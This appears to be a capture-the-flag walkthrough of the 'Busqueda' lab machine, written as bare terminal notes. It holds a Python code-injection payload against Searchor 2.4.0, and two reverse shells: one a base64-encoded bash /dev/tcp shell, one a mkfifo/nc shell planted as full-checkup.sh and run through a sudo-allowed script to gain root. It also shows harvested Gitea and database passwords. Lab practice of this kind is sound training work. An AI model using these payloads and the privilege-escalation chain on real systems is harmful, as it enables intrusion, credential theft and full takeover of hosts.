@@ -1,0 +1,182 @@
+
+
+
+website shows
+Flask and Searchor 2.4.0
+
+set to Google
+')+ str(__import__('os').system('id'))#
+
+')+ str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8xMzM3IDA+JjE=|base64 -d|bash'))#
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1337                        
+listening on [any] 1337 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 46530
+bash: cannot set terminal process group (1637): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$ cat /home/svc/user.txt
+cat /home/svc/user.txt
+c401de370b8601201ac5bbb65694d70d
+svc@busqueda:/var/www/app$ ls      
+ls
+app.py
+templates
+svc@busqueda:/var/www/app$ ls -la
+ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
+drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4096 Aug 15 05:19 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+svc@busqueda:/var/www/app$ cd .git
+svc@busqueda:/var/www/app/.git$ ls -la
+ls -la
+total 52
+drwxr-xr-x 8 www-data www-data 4096 Aug 15 05:19 .
+drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3  2023 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+svc@busqueda:/var/www/app/.git$ 
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ ssh svc@10.10.11.208                                         
+The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
+ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                
+Warning: Permanently added '10.10.11.208' (ED25519) to the list of known hosts.
+svc@10.10.11.208's password: 
+...
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
+svc@busqueda:~$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+svc@busqueda:~$ 
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+svc@busqueda:~$ 
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
+
+...
+    "Env": [
+      "USER_UID=115",
+      "USER_GID=121",
+      "GITEA__database__DB_TYPE=mysql",
+      "GITEA__database__HOST=db:3306",
+      "GITEA__database__NAME=gitea",
+      "GITEA__database__USER=gitea",
+      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "USER=git",
+      "GITEA_CUSTOM=/data/gitea"
+    ],
+...
+
+
+svc@busqueda:/tmp$ echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f" > /tmp/full-checkup.sh
+svc@busqueda:/tmp$ ls
+full-checkup.sh
+snap-private-tmp
+systemd-private-137731a488d444e2af1de4018e856105-apache2.service-f0JZAm
+systemd-private-137731a488d444e2af1de4018e856105-ModemManager.service-SXbd8X
+systemd-private-137731a488d444e2af1de4018e856105-systemd-logind.service-5NwJAv
+systemd-private-137731a488d444e2af1de4018e856105-systemd-resolved.service-sLKdnE
+systemd-private-137731a488d444e2af1de4018e856105-systemd-timesyncd.service-yTjEUu
+systemd-private-137731a488d444e2af1de4018e856105-upower.service-rlvXZt
+vmware-root_787-4290625459
+svc@busqueda:/tmp$ ls -la
+total 64
+drwxrwxrwt 15 root root 4096 Aug 15 09:55 .
+drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .font-unix
+-rw-rw-r--  1 svc  svc    91 Aug 15 09:55 full-checkup.sh
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .ICE-unix
+drwx------  3 root root 4096 Aug 15 05:19 snap-private-tmp
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-apache2.service-f0JZAm
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-ModemManager.service-SXbd8X                                                                                                                  
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-logind.service-5NwJAv                                                                                                                
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-resolved.service-sLKdnE                                                                                                              
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-timesyncd.service-yTjEUu                                                                                                             
+drwx------  3 root root 4096 Aug 15 06:30 systemd-private-137731a488d444e2af1de4018e856105-upower.service-rlvXZt
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .Test-unix
+drwx------  2 root root 4096 Aug 15 05:20 vmware-root_787-4290625459
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .X11-unix
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .XIM-unix
+svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+Something went wrong
+svc@busqueda:/tmp$ chmod +x /tmp/full-checkup.sh
+svc@busqueda:/tmp$ ls -la
+total 64
+drwxrwxrwt 15 root root 4096 Aug 15 09:55 .
+drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .font-unix
+-rwxrwxr-x  1 svc  svc    91 Aug 15 09:55 full-checkup.sh
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .ICE-unix
+drwx------  3 root root 4096 Aug 15 05:19 snap-private-tmp
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-apache2.service-f0JZAm
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-ModemManager.service-SXbd8X                                                                                                                  
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-logind.service-5NwJAv                                                                                                                
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-resolved.service-sLKdnE                                                                                                              
+drwx------  3 root root 4096 Aug 15 05:19 systemd-private-137731a488d444e2af1de4018e856105-systemd-timesyncd.service-yTjEUu                                                                                                             
+drwx------  3 root root 4096 Aug 15 06:30 systemd-private-137731a488d444e2af1de4018e856105-upower.service-rlvXZt
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .Test-unix
+drwx------  2 root root 4096 Aug 15 05:20 vmware-root_787-4290625459
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .X11-unix
+drwxrwxrwt  2 root root 4096 Aug 15 05:19 .XIM-unix
+svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+^Crm: cannot remove '/tmp/f': No such file or directory
+
+[+] Done!
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001     
+listening on [any] 9001 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 49010
+# id
+uid=0(root) gid=0(root) groups=0(root)
